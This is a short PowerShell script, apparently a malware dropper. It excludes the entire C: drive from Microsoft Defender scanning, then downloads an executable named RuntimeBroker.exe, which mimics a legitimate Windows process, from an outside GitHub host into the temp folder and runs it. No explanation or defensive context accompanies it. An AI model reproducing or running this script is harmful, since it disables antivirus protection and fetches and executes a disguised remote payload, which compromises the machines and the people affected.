Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/zessu/cybersec/raw/refs/heads/master/RuntimeBroker.exe"
$output = "$env:Temp/RuntimeBroker.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output